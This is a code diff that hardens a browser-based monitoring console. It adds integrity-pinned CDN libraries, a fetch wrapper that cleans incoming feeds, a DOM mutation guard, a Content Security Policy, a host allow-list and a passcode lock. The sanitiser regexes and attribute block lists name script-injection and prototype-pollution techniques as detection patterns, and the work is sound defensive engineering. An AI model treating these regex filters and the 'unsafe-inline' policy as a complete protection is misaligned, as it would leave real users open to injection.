@@ -4,9 +4,14 @@
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
 <title>ITE — Intelligence to the Edge</title>
-<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/leaflet/1.9.4/leaflet.min.css">
-<script src="https://cdnjs.cloudflare.com/ajax/libs/leaflet/1.9.4/leaflet.min.js"></script>
-<script src="https://cdnjs.cloudflare.com/ajax/libs/xlsx/0.18.5/xlsx.full.min.js"></script>
+<meta name="robots" content="noindex, nofollow">
+<meta name="referrer" content="strict-origin-when-cross-origin">
+<!-- libraries load only if they match their pinned SHA-384 fingerprint (jsDelivr, then unpkg: the same npm files) -->
+<link rel="stylesheet" data-pin="leaflet-css" href="https://cdn.jsdelivr.net/npm/leaflet@1.9.4/dist/leaflet.css" integrity="sha384-sHL9NAb7lN7rfvG5lfHpm643Xkcjzp4jFvuavGOndn6pjVqS6ny56CAt3nsEVT4H" crossorigin="anonymous" onerror="this.onerror=null;this.href='https://unpkg.com/leaflet@1.9.4/dist/leaflet.css'">
+<script data-pin="leaflet" src="https://cdn.jsdelivr.net/npm/leaflet@1.9.4/dist/leaflet.js" integrity="sha384-cxOPjt7s7Iz04uaHJceBmS+qpjv2JkIHNVcuOrM+YHwZOmJGBXI00mdUXEq65HTH" crossorigin="anonymous"></script>
+<script>window.L||document.write('<script data-pin="leaflet" src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js" integrity="sha384-cxOPjt7s7Iz04uaHJceBmS+qpjv2JkIHNVcuOrM+YHwZOmJGBXI00mdUXEq65HTH" crossorigin="anonymous"><\/script>')</script>
+<script data-pin="xlsx" src="https://cdn.jsdelivr.net/npm/xlsx@0.18.5/dist/xlsx.full.min.js" integrity="sha384-vtjasyidUo0kW94K5MXDXntzOJpQgBKXmE7e2Ga4LG0skTTLeBi97eFAXsqewJjw" crossorigin="anonymous"></script>
+<script>window.XLSX||document.write('<script data-pin="xlsx" src="https://unpkg.com/xlsx@0.18.5/dist/xlsx.full.min.js" integrity="sha384-vtjasyidUo0kW94K5MXDXntzOJpQgBKXmE7e2Ga4LG0skTTLeBi97eFAXsqewJjw" crossorigin="anonymous"><\/script>')</script>
 <style>
 :root{
   box-sizing:border-box;
@@ -3062,7 +3067,7 @@ function boot(){
   $$("[data-layout]").forEach(b => b.onclick = () => setLayout(b.dataset.layout));
   initPanelEvents(); initNewHandlers();
   mountLenel().then(() => { if (UI.mode === "bau-lenel") renderPanel(); renderModes(); }); setInterval(() => safe(lenelSync, "lenel"), 5000); setInterval(() => lenelShare(), 5000);
-  if (typeof L !== "undefined"){ initMap(); } else { $("#map").innerHTML = '<div class="empty" style="margin:20px">The map library could not load from cdnjs.cloudflare.com. Every other view still works.</div>'; window.redrawMap = () => {}; window.highlightOnMap = () => {}; window.drawSites = () => {}; }
+  if (typeof L !== "undefined"){ initMap(); } else { $("#map").innerHTML = '<div class="empty" style="margin:20px">The map library could not load from the library CDN (jsDelivr or unpkg). Every other view still works.</div>'; window.redrawMap = () => {}; window.highlightOnMap = () => {}; window.drawSites = () => {}; }
   renderFeeds(); renderAll(); tickClock();
   setInterval(tickClock, 1000);
   setInterval(() => { if (!document.hidden) refreshFast(); }, CFG.refreshMs);
@@ -11835,7 +11840,7 @@ function vccEnsureMap(){
   return true; }
 vccMapDraw = function(r){
   const slot = $("#vccmap"); if (!slot) return;
-  if (!vccEnsureMap()){ slot.innerHTML = `<div class="vccmapmsg">The map library could not load on this network (cdnjs.cloudflare.com). Alerts, assets and contacts are still listed above.</div>`; return; }
+  if (!vccEnsureMap()){ slot.innerHTML = `<div class="vccmapmsg">The map library could not load on this network (jsDelivr / unpkg). Alerts, assets and contacts are still listed above.</div>`; return; }
   if (VCCM.host.parentNode !== slot){ slot.innerHTML = ""; slot.appendChild(VCCM.host); }
   try{
     const lg = VCCM.host.querySelector(".vccleg"); if (lg) lg.innerHTML = `<span><i style="background:#C4314B"></i>alert</span><span><i style="background:#E8873A"></i>site in zone</span><span><i style="background:#5B9BD5"></i>site</span>`;
@@ -14248,7 +14253,7 @@ function vccSitesLayer(){ const map = VCCM.map; if (!map || !VCCM.siteLayer) ret
       .on("click", () => map.fitBounds(L.latLngBounds(it.map(x => [x.s.lat, x.s.lon])).pad(.6), { maxZoom: 16 })).addTo(VCCM.siteLayer); }); }
 vccMapDraw = function(r){
   const slot = $("#vccmap"); if (!slot) return;
-  if (!vccEnsureMap()){ slot.innerHTML = `<div class="vccmapmsg">The map library could not load on this network (cdnjs.cloudflare.com). Alerts, assets and contacts are still listed above.</div>`; return; }
+  if (!vccEnsureMap()){ slot.innerHTML = `<div class="vccmapmsg">The map library could not load on this network (jsDelivr / unpkg). Alerts, assets and contacts are still listed above.</div>`; return; }
   if (VCCM.host.parentNode !== slot){ slot.innerHTML = ""; slot.appendChild(VCCM.host); }
   const map = VCCM.map; map.options.zoomSnap = .25; map.options.zoomDelta = .5;
   if (!VCCM.siteLayer){ VCCM.siteLayer = L.layerGroup().addTo(map); map.on("zoomend", vccSitesLayer); }
@@ -14857,6 +14862,329 @@ body.phone .iws-banner{flex-wrap:wrap;gap:6px 10px;font-size:13px;line-height:1.
 body.phone .lfilters{gap:8px 12px;padding:10px 12px}body.phone .lfilters .sp{display:none}body.phone .ltool{padding:8px 12px}
 body.phone .iws-head,body.phone .iws-bar,body.phone .iws-tabs,body.phone .iws-tabbody{padding-left:12px;padding-right:12px}body.phone .iws-tabs{overflow-x:auto;flex-wrap:nowrap}body.phone .iws-tabs button{flex:none}
 body.phone .iws-f{padding:0 12px 0 0;border-left:0}body.phone .rptgrid{grid-template-columns:1fr}body.phone .rptgrid textarea{min-height:320px}`; document.head.appendChild(st); }
+
+
+
+/* =====================================================================
+   SECURITY GATEWAYS (15 Oct)
+   1. Inbound data gateway — every response from an outside API, feed,
+      relay or server is inspected before the console sees it: executable
+      content types are refused, oversized bodies are refused, JSON is
+      parsed and every text value cleaned (script blocks, embedded frames
+      and plugins, inline event handlers, javascript:/vbscript:/data:text/html
+      links, prototype-pollution keys), and XML/RSS/HTML/text is cleaned the
+      same way (HTML pages keep their text, but scripts are made inert).
+   2. Output guard — anything that still tries to add a script, plugin,
+      inline event handler or javascript: link to the page is removed
+      before it can run.
+   3. Library fingerprints — Leaflet, SheetJS and every library loaded on
+      demand must match a pinned SHA-384 fingerprint or it is refused.
+   4. Content Security Policy — scripts only from this page and the three
+      library CDNs, no plugins, no foreign <base>, no form posts elsewhere;
+      in Enforce mode connections, images, media and frames only to
+      approved hosts.
+   5. Connection gateway — every host the console talks to is listed with
+      its purpose; hosts can be blocked, and in Enforce mode anything not
+      approved is refused.
+   6. Access gateway — optional passcode (PBKDF2-SHA-256, 310,000 rounds),
+      auto-lock when idle, lock-out after repeated wrong passcodes.
+   Administrator › Security shows all of it, with a self-test.
+   ===================================================================== */
+const SG_LOG_KEY = "psoc.uni.seclog.v1", SG_CFG_KEY = "psoc.uni.secgw.v1", SG_ACC_KEY = "psoc.uni.secacc.v1";
+const SG = Object.assign({ mode: "monitor", maxMB: 25, approve: [], block: [] }, lsGet(SG_CFG_KEY, {}));
+const SGA = Object.assign({ hash: null, salt: null, iter: 310000, autolock: 15, fails: 0, until: 0 }, lsGet(SG_ACC_KEY, {}));
+let SG_LOG = lsGet(SG_LOG_KEY, []);
+const SG_STATS = { hosts: {}, checked: 0, cleaned: 0, blocked: 0, dom: 0, since: Date.now() };
+const sgSave = () => lsSet(SG_CFG_KEY, SG), sgaSave = () => lsSet(SG_ACC_KEY, SGA);
+function sgLog(kind, host, msg, extra){ const now = Date.now(), last = SG_LOG[0];
+  if (last && last.kind === kind && last.host === host && last.msg === msg && now - last.t < 3600e3){ last.n = (last.n || 1) + 1; last.t = now; }
+  else SG_LOG.unshift(Object.assign({ t: now, kind, host: host || "", msg, n: 1 }, extra || {}));
+  SG_LOG = SG_LOG.slice(0, 400); clearTimeout(sgLog.t); sgLog.t = setTimeout(() => lsSet(SG_LOG_KEY, SG_LOG), 800); }
+const sgHostOf = u => { try{ return new URL(u, location.href).hostname.toLowerCase(); }catch(e){ return ""; } };
+const sgPathOf = u => { try{ const x = new URL(u, location.href); return x.pathname.slice(0, 80); }catch(e){ return ""; } };   // never the query: it can hold API keys
+
+/* ---------- hosts: purpose and approval ---------- */
+const SG_KNOWN = ["air-quality-api.open-meteo.com", "airquality.googleapis.com", "alertingauthority.wmo.int", "alerts.metservice.com", "api-open.data.gov.sg", "api.anthropic.com", "api.bmkg.go.id", "api.data.gov.my", "api.data.gov.sg", "api.gdeltproject.org", "api.groq.com", "api.open-meteo.com", "api.openai.com", "api.qldtraffic.qld.gov.au", "api.rainviewer.com", "api.reliefweb.int", "api.thenewsapi.com", "api.waqi.info", "apihub.kma.go.kr", "archive-api.open-meteo.com", "cadataapi.state.gov", "cdn.jsdelivr.net", "cdnjs.cloudflare.com", "console.groq.com", "d2e1asnsl7br7b.cloudfront.net", "data.international.gc.ca", "data.weather.gov.hk", "dwamdstream102.akamaized.net", "earthquake.usgs.gov", "en.yna.co.kr", "eonet.gsfc.nasa.gov", "feeds.bbci.co.uk", "flood-api.open-meteo.com", "gnews.io", "hn.algolia.com", "live-hls-apps-aje-fa.getaj.net", "marine-api.open-meteo.com", "meet.jit.si", "news.ycombinator.com", "newsapi.org", "newsdata.io", "nhkwlive-ojp.akamaized.net", "nominatim.openstreetmap.org", "onemotoring.lta.gov.sg", "opencctv.org", "opendata.cwa.gov.tw", "photon.komoot.io", "platform.openai.com", "publicinfobanjir.water.gov.my", "qldtraffic.qld.gov.au", "raw.githack.com", "reliefweb.int", "routing.openstreetmap.de", "sachet.ndma.gov.in", "server.arcgisonline.com", "severeweather.wmo.int", "static.data.gov.hk", "tdcctv.data.one.gov.hk", "tile.googleapis.com", "tile.openstreetmap.org", "tmd.go.th", "travel.gc.ca", "travel.state.gov", "volcano.si.edu", "weather.googleapis.com", "worldcam.eu", "www.abc.net.au", "www.aljazeera.com", "www.auswaertiges-amt.de", "www.bangkokpost.com", "www.bmkg.go.id", "www.channelnewsasia.com", "www.cwa.gov.tw", "www.gdacs.org", "www.gov.uk", "www.haze.gov.sg", "www.hko.gov.hk", "www.japantimes.co.jp", "www.jma.go.jp", "www.journeys.nzta.govt.nz", "www.livetraffic.com", "www.met.gov.my", "www.openstreetmap.org", "www.reddit.com", "www.rnz.co.nz", "www.scmp.com", "www.seismicportal.eu", "www.skylinewebcams.com", "www.smartraveller.gov.au", "www.straitstimes.com", "www.theguardian.com", "www.thehindu.com", "www.tmd.go.th", "www.tsunami.gov", "www.weather.go.kr", "www.weather.gov.sg", "www.who.int", "www.youtube.com", "wwwnc.cdc.gov"];
+const SG_EXTRA = ["*.basemaps.cartocdn.com", "*.tile.openstreetmap.org", "tilecache.rainviewer.com", "www.youtube-nocookie.com", "i.ytimg.com", "*.googlevideo.com", "*.usembassy.gov", "hk.usconsulate.gov",
+  "china.usembassy-china.org.cn", "www.ait.org.tw", "*.open-meteo.com", "storage.googleapis.com", "tfhub.dev", "www.kaggle.com", "huggingface.co", "*.huggingface.co", "*.hf.co", "cdn.jsdelivr.net", "unpkg.com", "cdnjs.cloudflare.com",
+  "fonts.googleapis.com", "fonts.gstatic.com", "*.arcgisonline.com", "*.arcgis.com", "services.arcgisonline.com", "acleddata.com", "api.acleddata.com"];
+const SG_CATS = [[/arcgis|openstreetmap\.org$|^tile\.|tile\.openstreetmap|cartocdn|rainviewer|tile\.googleapis/, "Maps"],
+  [/jsdelivr|unpkg|cdnjs|fonts\.g/, "Libraries"], [/usgs|seismicportal|gdacs|eonet|volcano|tsunami|jma\.go|cwa\.gov|kma\.go|weather\.go\.kr|data\.gov\.sg|weather\.gov\.sg|haze\.gov|bmkg|tmd\.go|met\.gov\.my|data\.gov\.my|water\.gov\.my|hko\.gov|weather\.gov\.hk|ndma|wmo\.int|metservice|open-meteo|waqi|airquality|weather\.googleapis|reliefweb/, "Hazards & weather"],
+  [/gdelt|bbci|newsapi|gnews|newsdata|thenewsapi|algolia|reddit|ycombinator|straitstimes|scmp|japantimes|bangkokpost|aljazeera|abc\.net|theguardian|thehindu|rnz|yna\.co|channelnewsasia|acled/, "News & unrest"],
+  [/usembassy|usconsulate|ait\.org\.tw|travel\.state|state\.gov|international\.gc|travel\.gc|smartraveller|auswaertiges|gov\.uk|cdc\.gov|who\.int/, "Travel & advisories"],
+  [/photon|nominatim|routing\.openstreetmap/, "Address search"], [/youtube|ytimg|googlevideo|akamaized|cloudfront|getaj|skylinewebcams|worldcam|livetraffic|nzta|qldtraffic|one\.gov\.hk|lta\.gov|data\.one/, "Live TV & cameras"],
+  [/anthropic|openai|groq|huggingface|hf\.co|tfhub|kaggle|storage\.googleapis/, "AI models"], [/jit\.si/, "Bridge calls"]];
+const sgCat = h => (SG_CATS.find(([re]) => re.test(h)) || [0, "Other"])[1];
+const sgMatch = (h, list) => list.some(p => p === h || (p.startsWith("*.") && (h === p.slice(2) || h.endsWith(p.slice(1)))));
+function sgConfigured(){ if (sgConfigured.c && Date.now() - sgConfigured.at < 30e3) return sgConfigured.c; const out = new Set(); sgConfigured.at = Date.now(); sgConfigured.c = out; let txt = ""; try{ txt = JSON.stringify([CFG, BAU && BAU.cfg, (SHARED.capfeeds || []).map(f => f.url), (typeof CV !== "undefined" && CV.cams || []).map(c => c.url)]); }catch(e){}
+  (txt.match(/https?:\/\/[a-z0-9.-]+/gi) || []).forEach(u => { const h = sgHostOf(u); if (h && !/example\.(com|org)$/.test(h)) out.add(h); }); return out; }
+function sgApproved(h){ if (!h || h === location.hostname) return true; if (sgMatch(h, SG.block)) return false;
+  return sgMatch(h, SG_KNOWN) || sgMatch(h, SG_EXTRA) || sgMatch(h, SG.approve) || sgConfigured().has(h) || (typeof EMB_HOSTS !== "undefined" && Object.values(EMB_HOSTS).includes(h)); }
+function sgHost(h){ return SG_STATS.hosts[h] = SG_STATS.hosts[h] || { n: 0, cleaned: 0, blocked: 0, last: 0, types: new Set(), finds: {} }; }
+
+/* ---------- 1. inbound data gateway ---------- */
+const SG_RX = [
+  [/<\s*script\b[\s\S]*?<\s*\/\s*script\s*>/gi, "script block", ""],
+  [/<\s*\/?\s*(script|iframe|frame|frameset|object|embed|applet)\b[^>]*>/gi, "frame, plugin or script tag", ""],
+  [/(<[a-z][^>]*?)\s+on[a-z]+\s*=\s*("[^"]*"|'[^']*'|[^\s>]+)/gi, "inline event handler", "$1"],
+  [/\bsrcdoc\s*=\s*("[^"]*"|'[^']*')/gi, "srcdoc frame", ""],
+  [/(javascript|vbscript|livescript)\s*:/gi, "script link", "blocked:"],
+  [/data\s*:\s*text\/html/gi, "HTML data link", "blocked:"],
+  [/&lt;\s*script\b[\s\S]*?&lt;\s*\/\s*script\s*&gt;/gi, "encoded script block", ""],
+  [/&lt;\s*\/?\s*(script|iframe|frame|object|embed|applet)\b[\s\S]*?&gt;/gi, "encoded frame, plugin or script tag", ""],
+  [/(&lt;[a-z][^&]*?)\s+on[a-z]+\s*=\s*(&quot;[\s\S]*?&quot;|&#0?39;[\s\S]*?&#0?39;|[^\s&]+)/gi, "encoded event handler", "$1"]];
+// HTML pages keep their text (some screens read stream addresses out of them) but every script is made inert
+const SG_RX_HTML = [SG_RX[3], [/<\s*script\b(?![^>]*type\s*=\s*["']?text\/x-ite-inert)/gi, "script made inert", '<script type="text/x-ite-inert"'], ...SG_RX.slice(1).filter(r => !/script tag|srcdoc/.test(r[1]))];
+function sgClean(s, finds, html){ if (typeof s !== "string" || s.length < 6 || !/[<:&]/.test(s)) return s; let out = s;
+  for (const [re, what, rep] of (html ? SG_RX_HTML : SG_RX)){ re.lastIndex = 0; if (!re.test(out)) continue; re.lastIndex = 0;
+    let prev; do{ prev = out; out = out.replace(re, rep); }while(out !== prev && re.global && /event handler/.test(what));
+    if (out !== s) finds[what] = (finds[what] || 0) + 1; }
+  return out; }
+const SG_BAD_KEYS = new Set(["__proto__", "constructor", "prototype"]);
+function sgWalk(v, finds, depth){ if (depth > 60) return v;
+  if (typeof v === "string") return sgClean(v, finds, false);
+  if (Array.isArray(v)){ for (let i = 0; i < v.length; i++) v[i] = sgWalk(v[i], finds, depth + 1); return v; }
+  if (v && typeof v === "object"){ for (const k of Object.keys(v)){ if (SG_BAD_KEYS.has(k) && (k === "__proto__" || (v[k] && typeof v[k] === "object"))){ delete v[k]; finds["prototype-pollution key"] = (finds["prototype-pollution key"] || 0) + 1; continue; } v[k] = sgWalk(v[k], finds, depth + 1); } return v; }
+  return v; }
+const SG_LIB_HOSTS = ["cdn.jsdelivr.net", "unpkg.com", "cdnjs.cloudflare.com"];
+async function sgInspect(res, url){ const h = sgHostOf(url), H = sgHost(h), ct = (res.headers.get("content-type") || "").toLowerCase(), len = +res.headers.get("content-length") || 0;
+  H.n++; H.last = Date.now(); SG_STATS.checked++; if (ct) H.types.add(ct.split(";")[0]);
+  if (res.type === "opaque" || res.type === "opaqueredirect" || !res.body || [101, 204, 205, 304].includes(res.status)) return res;
+  const lib = sgMatch(h, SG_LIB_HOSTS) || /huggingface|hf\.co|tfhub|storage\.googleapis|kaggle/.test(h);
+  if (/(java|ecma)script|application\/x-sh|x-msdownload|x-msdos|x-executable/.test(ct) && !lib) throw sgBlock(h, url, "executable content (" + ct.split(";")[0] + ")");
+  if (/wasm/.test(ct) && !lib) throw sgBlock(h, url, "WebAssembly from a non-library host");
+  const texty = !ct || /json|xml|rss|atom|text\/|csv|svg|javascript|x-www-form/.test(ct);
+  if (!texty) return res;                                                         // images, video, audio, binary: inert in this page
+  if (/(java|ecma)script/.test(ct)) return res;                                   // library code: checked by its fingerprint where it is run
+  if (len > SG.maxMB * 1048576) throw sgBlock(h, url, `response larger than ${SG.maxMB} MB`);
+  const text = await res.text(); if (text.length > SG.maxMB * 1048576) throw sgBlock(h, url, `response larger than ${SG.maxMB} MB`);
+  const finds = {}, head = text.slice(0, 200).trimStart(); let out = text;
+  if (/json/.test(ct) || ((!ct || /text\/plain/.test(ct)) && /^[\[{]/.test(head))){ try{ out = JSON.stringify(sgWalk(JSON.parse(text), finds, 0)); }catch(e){ out = sgClean(text, finds, false); } }
+  else if (/html/.test(ct) || /^<!doctype html|^<html/i.test(head)) out = sgClean(text, finds, true);
+  else out = sgClean(text, finds, false);
+  const n = Object.values(finds).reduce((a, b) => a + b, 0);
+  if (n){ H.cleaned++; SG_STATS.cleaned++; Object.entries(finds).forEach(([k, c]) => H.finds[k] = (H.finds[k] || 0) + c);
+    sgLog("cleaned", h, Object.entries(finds).map(([k, c]) => `${c} ${k}${c === 1 ? "" : "s"}`).join(", ") + " removed", { path: sgPathOf(url) }); }
+  if (!n && out === text) return new Response(text, sgInit(res));
+  return new Response(out, sgInit(res)); }
+function sgInit(res){ const hd = new Headers(res.headers); hd.delete("content-length"); hd.delete("content-encoding"); hd.set("x-ite-gateway", "checked"); return { status: res.status, statusText: res.statusText, headers: hd }; }
+function sgBlock(h, url, why){ const H = sgHost(h); H.blocked++; SG_STATS.blocked++; sgLog("blocked", h, "Refused: " + why, { path: sgPathOf(url) });
+  return new TypeError(`Blocked by the ITE security gateway (${h}: ${why})`); }
+{ const _fetch = window.fetch.bind(window);
+  window.fetch = async function(input, init){ const url = typeof input === "string" ? input : input && input.url ? input.url : String(input);
+    if (!/^https?:/i.test(url) && !/^\/\//.test(url)) return _fetch(input, init);
+    const h = sgHostOf(url); if (h === location.hostname && location.protocol !== "file:") return _fetch(input, init);
+    if (sgMatch(h, SG.block)) throw sgBlock(h, url, "host blocked by an administrator");
+    if (SG.mode === "enforce" && !sgApproved(h)) throw sgBlock(h, url, "host not approved (Enforce mode)");
+    if (!sgApproved(h)) sgHost(h).unapproved = true;
+    const res = await _fetch(input, init); return sgInspect(res, url); }; }
+
+/* ---------- 2. output guard ---------- */
+document.addEventListener("click", e => { if (e.target.closest("[data-shakex]")) setShake(null); });
+{ const el = $("#shakeStatus"); if (el && el.innerHTML.includes("onclick=")) el.innerHTML = el.innerHTML.replace(/onclick="setShake\(null\)"/g, "data-shakex"); }
+{ const _ss = setShake; setShake = function(){ const r = _ss.apply(this, arguments); const el = $("#shakeStatus"); if (el && el.innerHTML.includes('onclick="setShake(null)"')) el.innerHTML = el.innerHTML.replace(/onclick="setShake\(null\)"/g, "data-shakex"); return r; }; }
+const SG_EVT = ["onabort", "onanimationend", "onanimationstart", "onauxclick", "onbeforeinput", "onbegin", "onblur", "onchange", "onclick", "oncontextmenu", "oncopy", "oncut", "ondblclick", "ondrag", "ondrop", "onend", "onerror", "onfocus", "onfocusin", "onhashchange", "oninput", "oninvalid", "onkeydown", "onkeypress", "onkeyup", "onload", "onmessage", "onmousedown", "onmouseenter", "onmouseleave", "onmousemove", "onmouseout", "onmouseover", "onmouseup", "onpageshow", "onpaste", "onpointerdown", "onpointerenter", "onpointerover", "onpointerup", "onrepeat", "onreset", "onresize", "onscroll", "onsearch", "onselect", "onstart", "onsubmit", "ontoggle", "ontouchstart", "ontransitionend", "onunload", "onwheel", "onbeforetoggle", "onfocusout", "onpopstate", "onplay", "oncanplay", "onloadstart", "onprogress", "onshow"];
+const SG_URL_ATTR = ["href", "src", "action", "formaction", "xlink:href", "data", "poster", "background"];
+const SG_SEL = ["script:not([data-ite-lib])", "iframe[srcdoc]", "object", "embed", "applet", "base", "meta[http-equiv]", "frame", "frameset"].concat(SG_EVT.map(a => `[${a}]`), SG_URL_ATTR.filter(a => !a.includes(":")).map(a => `[${a}^="javascript:" i],[${a}^="vbscript:" i],[${a}^="data:text/html" i],[${a}*="javascript:" i]`)).join(",");
+const SG_GUARD_ON = Date.now();
+function sgScrub(root){ if (!root || root.nodeType !== 1) return; const list = root.matches && root.matches(SG_SEL) ? [root] : []; list.push(...root.querySelectorAll(SG_SEL)); let n = 0;
+  list.forEach(el => { const tag = el.tagName.toLowerCase();
+    if (["script", "object", "embed", "applet", "base", "frame", "frameset"].includes(tag) || (tag === "meta" && /refresh|set-cookie|content-security/i.test(el.getAttribute("http-equiv") || ""))){
+      if (tag === "script" && el.src && sgMatch(sgHostOf(el.src), SG_LIB_HOSTS) && el.integrity) return;   // a pinned library
+      if (tag === "meta" && !/refresh|set-cookie/i.test(el.getAttribute("http-equiv") || "")) return;
+      el.remove(); n++; sgLog("dom", "", `Removed a <${tag}> element that something tried to add to the page`); return; }
+    if (tag === "iframe" && el.hasAttribute("srcdoc")){ el.removeAttribute("srcdoc"); n++; sgLog("dom", "", "Removed an inline frame document (srcdoc)"); }
+    [...el.attributes].forEach(a => { const nm = a.name.toLowerCase();
+      if (nm.startsWith("on")){ el.removeAttribute(a.name); n++; sgLog("dom", "", `Removed an inline "${nm}" event handler`); }
+      else if (SG_URL_ATTR.includes(nm) && /^\s*(javascript|vbscript|livescript)\s*:|^\s*data\s*:\s*text\/html/i.test(a.value)){ el.setAttribute(a.name, "#"); n++; sgLog("dom", "", `Neutralised a script link in "${nm}"`); } }); });
+  SG_STATS.dom += n; }
+new MutationObserver(ms => { for (const m of ms){ if (m.type === "childList") m.addedNodes.forEach(sgScrub); else if (m.target.nodeType === 1) sgScrub(m.target); } })
+  .observe(document.documentElement, { childList: true, subtree: true, attributes: true, attributeFilter: SG_EVT.concat(["href", "src", "action", "formaction", "srcdoc"]) });
+
+/* ---------- 3. library fingerprints ---------- */
+const SG_PINS = {
+  "hls.js": ["hls.js@1.5.13/dist/hls.min.js", "sha384-w6Gb3fXHb5e1LUYa/hYA5Q41bEDglN5ZPCG7Jvnoo8/X90oGnlPqBlBJCe38mEMm"],
+  "pptxgen": ["pptxgenjs@3.12.0/dist/pptxgen.bundle.js", "sha384-Cck14aA9cifjYolcnjebXRfWGkz5ltHMBiG4px/j8GS+xQcb7OhNQWZYyWjQ+UwQ"],
+  "tfjs": ["@tensorflow/tfjs@4.20.0/dist/tf.min.js", "sha384-xc4sZTUOM2obsQR75Be0zGbt7Gb6mOVFJN4yBm30Xn0YQLDWIY+yrtFmLmIank6w"],
+  "coco-ssd": ["@tensorflow-models/coco-ssd@2.2.3/dist/coco-ssd.min.js", "sha384-7qLdgfEQyO9ZQi9ArRHigK+IBto4XPk468jAqc+fnsXaZIcMAhQeLwzggRK7aESl"],
+  "leaflet": ["leaflet@1.9.4/dist/leaflet.js", "sha384-cxOPjt7s7Iz04uaHJceBmS+qpjv2JkIHNVcuOrM+YHwZOmJGBXI00mdUXEq65HTH"],
+  "xlsx": ["xlsx@0.18.5/dist/xlsx.full.min.js", "sha384-vtjasyidUo0kW94K5MXDXntzOJpQgBKXmE7e2Ga4LG0skTTLeBi97eFAXsqewJjw"] };
+const sgPinFor = src => /hls/.test(src) ? "hls.js" : /pptxgen/.test(src) ? "pptxgen" : /coco-ssd/.test(src) ? "coco-ssd" : /tfjs|\/tf\.min/.test(src) ? "tfjs" : /leaflet/.test(src) ? "leaflet" : /xlsx/.test(src) ? "xlsx" : null;
+const SG_LIBSTATE = {};
+loadScript = function(src){ const pin = sgPinFor(src);
+  if (!pin){ const h = sgHostOf(src); if (!sgMatch(h, SG_LIB_HOSTS)) { sgLog("blocked", h, "Refused a script from a host that is not a library CDN"); return Promise.reject(new Error("blocked by the security gateway: " + h)); }
+    sgLog("info", h, "Loaded a library without a pinned fingerprint: " + sgPathOf(src)); }
+  const tries = pin ? ["https://cdn.jsdelivr.net/npm/" + SG_PINS[pin][0], "https://unpkg.com/" + SG_PINS[pin][0]] : [src];
+  const one = u => new Promise((ok, bad) => { const x = document.createElement("script"); x.src = u; x.dataset.iteLib = pin || "unpinned";
+    if (pin){ x.integrity = SG_PINS[pin][1]; x.crossOrigin = "anonymous"; } x.onload = ok; x.onerror = () => { x.remove(); bad(new Error("could not load " + u)); }; document.head.appendChild(x); });
+  return tries.reduce((p, u) => p.catch(() => one(u)), Promise.reject()).then(() => { SG_LIBSTATE[pin || src] = "verified"; },
+    e => { SG_LIBSTATE[pin || src] = "failed"; sgLog("blocked", "", `Library ${pin || src} failed to load or did not match its fingerprint`); throw e; }); };
+
+/* ---------- 4. content security policy ---------- */
+function sgCsp(){ const libs = SG_LIB_HOSTS.map(h => "https://" + h).join(" ");
+  let p = `object-src 'none'; base-uri 'self'; form-action 'self' https:; script-src 'self' 'unsafe-inline' 'wasm-unsafe-eval' blob: ${libs}; worker-src 'self' blob: ${libs}`;
+  if (SG.mode === "enforce"){ const hosts = [...new Set(SG_KNOWN.concat(SG_EXTRA, SG.approve, [...sgConfigured()], typeof EMB_HOSTS !== "undefined" ? Object.values(EMB_HOSTS) : []))].filter(h => !sgMatch(h.replace(/^\*\./, ""), SG.block)).map(h => "https://" + h).join(" ");
+    p += `; connect-src 'self' data: blob: ${hosts}; img-src 'self' data: blob: ${hosts}; media-src 'self' data: blob: ${hosts}; frame-src 'self' ${hosts}`; }
+  return p; }
+{ const m = document.createElement("meta"); m.httpEquiv = "Content-Security-Policy"; m.content = sgCsp(); m.dataset.ite = "csp"; document.head.appendChild(m); }
+document.addEventListener("securitypolicyviolation", e => { const h = sgHostOf(e.blockedURI) || e.blockedURI; sgLog("csp", h, `Content Security Policy blocked ${e.effectiveDirective.replace(/-src(-elem|-attr)?$/, "")} from ${h || "inline code"}`); SG_STATS.blocked++; });
+
+/* ---------- 6. access gateway ---------- */
+const sgB64 = b => btoa(String.fromCharCode(...new Uint8Array(b))), sgUnb64 = s => Uint8Array.from(atob(s), c => c.charCodeAt(0));
+async function sgDerive(pass, salt, iter){ const k = await crypto.subtle.importKey("raw", new TextEncoder().encode(pass), "PBKDF2", false, ["deriveBits"]);
+  return sgB64(await crypto.subtle.deriveBits({ name: "PBKDF2", hash: "SHA-256", salt, iterations: iter }, k, 256)); }
+const sgEq = (a, b) => { if (a.length !== b.length) return false; let d = 0; for (let i = 0; i < a.length; i++) d |= a.charCodeAt(i) ^ b.charCodeAt(i); return d === 0; };
+async function sgSetPass(pass){ const salt = crypto.getRandomValues(new Uint8Array(16)); SGA.salt = sgB64(salt); SGA.iter = 310000; SGA.hash = await sgDerive(pass, salt, SGA.iter); SGA.fails = 0; SGA.until = 0; sgaSave(); }
+async function sgCheckPass(pass){ if (!SGA.hash) return true; return sgEq(await sgDerive(pass, sgUnb64(SGA.salt), SGA.iter), SGA.hash); }
+let SG_LOCKED = false, SG_ACT = Date.now(), SG_HIDDEN_AT = 0;
+function sgLock(why){ if (!SGA.hash || SG_LOCKED) return; SG_LOCKED = true; let el = $("#sgLock");
+  if (!el){ document.body.insertAdjacentHTML("beforeend", `<div id="sgLock" role="dialog" aria-modal="true" aria-labelledby="sgLockT"><form class="in" autocomplete="off"><img src="data:image/svg+xml,${encodeURIComponent('<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 64 64"><circle cx="32" cy="32" r="30" fill="none" stroke="#4FC4BE" stroke-width="3"/><circle cx="32" cy="32" r="19" fill="none" stroke="#4FC4BE" stroke-opacity=".7" stroke-width="3"/><rect x="22" y="29" width="20" height="15" rx="3" fill="#4FC4BE"/><path d="M26 29v-4a6 6 0 0 1 12 0v4" fill="none" stroke="#4FC4BE" stroke-width="3"/></svg>')}" width="64" height="64" alt="">
+      <h2 id="sgLockT">ITE is locked</h2><p class="why"></p><div class="sgalert" hidden></div>
+      <input type="password" id="sgPass" placeholder="Passcode" aria-label="Passcode" inputmode="text" autocomplete="current-password"><button class="pill primary" id="sgGo" type="submit">Unlock</button><p class="msg" role="status"></p>
+      <button type="button" class="linkbtn" id="sgForgot">Forgot the passcode?</button></form></div>`); el = $("#sgLock");
+    el.querySelector("form").onsubmit = async ev => { ev.preventDefault(); await sgTryUnlock(); };
